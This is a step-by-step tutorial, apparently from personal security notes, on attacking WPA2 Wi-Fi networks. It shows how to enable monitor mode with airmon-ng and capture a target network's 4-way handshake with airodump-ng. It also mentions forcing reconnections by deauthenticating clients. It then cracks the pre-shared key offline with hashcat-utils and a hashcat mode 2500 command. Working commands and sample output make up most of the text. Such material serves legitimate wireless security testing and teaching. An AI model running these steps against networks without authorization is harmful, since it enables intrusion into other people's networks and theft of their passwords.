---
title: 4-Way Handshake Attack
---

## What is this about?
Listening for a specific exchange to get a hash and crack it. Yeah that's it...

### Step 0
Read [this](https://en.wikipedia.org/wiki/IEEE_802.11i-2004) like your life depended on it.

### Check out who's around you
Add a monitoring mode to your wifi interface, which we're gonna call potato-interface
```
airmon-ng start potato-interface
```
Check that you have a new *potato-interfacemon* or just a *mon0* interface by running your usual iwconfig/ipconfig/ip a/... 

If your interface is setup to always be monitoring for whatever reason, you'll just get a *monitor mode already enabled for xxx* and the name won't change

Figure out who your target is by running
```
airodump-ng mon0
```
Which should fill up your terminal with the BSSIDs, channels, ciphers, ..., ESSID of anything in range of your antenna, which should look something like this

```
CH 9 ][ Elapsed: 2 min ][ 2020–07–07 21:00 
BSSID			PWR	Beacons	#Data	#/s	CH	MB	ENC	CIPHER	AUTH	ESSID

00:11:22:33:44:55	-79	...	... 	...	1	...	OPN			French Fries
00:11:22:33:44:55	-78	...	... 	...	2	...	WPA2	CCMP	PSK	Hash Browns
55:44:33:22:11:00	-35	...	... 	...	3	...	WPA2	CCMP	PSK	<length: 0> 
...
```
Up to here you've basically overcomplicated opening your Wi-Fi manager and looking at the available networks... But wait there's more!

### Capturing the 4-way handshake
As I'm sure you've read on the previous Wiki link, a 4-way handshake happens when a user tries to authenticate to an access point. Which means we're going to have to wait for some to connect!
Now lets say we're attacking the *Hash Browns* network, which has the BSSID 00:11:22:33:44:55 and is on the channel 2.

To do that all that needs to be ran is a simple
```
airodump-ng -c 2 --bssid 00:11:22:33:44:55 -w /tmp/potato.cap mon0
```
To start getting the whole package capture process and drop the resulting potato.cap in the local tmp directory.

Now there are two options, you start your stuff, let it run and wait for someone to connect OR you start [deauthing](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) people with [mdk4](https://github.com/aircrack-ng/mdk4), aireplay-ng, or whatever tool you pick, but this is 10/10 visible to any network admin when it happens so plan it ahead...

Eventually, anywhere between when you start and stop the previous process, you'll end up with the following message on the top right of your terminal :p
```
CH 9 ][ Elapsed: 2 min ][ 2020–07–07 21:00 ][ WPA handshake: de:ad:be:ef:13:37
```
And that's pretty much it... Now you can either ctrl+c and move to the next step or let it run in the background to get more handshakes, which means more hashes to crack!

### Cracking the password
Yes you can use aircrack-ng to run a basic bruteforce on the .cap file but this is not where we're going... Instead, get [hashcat-utils](https://github.com/hashcat/hashcat-utils) and run a *make*.

Then run the following to convert your .cap file into something you can use hashcat on directly
```
cap2hccapx potato.cap potato.hccapx
```
Finally, run your hashcat on it with whatever settings you want or feel like...
```
hashcat -m 2500 -w 4 -a 3 potato.hccapx mypwnerdictionnary -r mypwnerrules.rule
```
More waiting here, but this wouldn't be fun if the cracking was instant right? 

I mean it's not like you could precompute rainbowtables with coWPAtty's [genpmk](https://github.com/joswr1ght/cowpatty) or [genpmk-mp](https://github.com/michiellemmens/genpmk-mp) for your specific target beforehand since the PSK is basically a HMAC-SHA1 with the SSID as salt... Just like the wiki explains... Right... RIGHT?!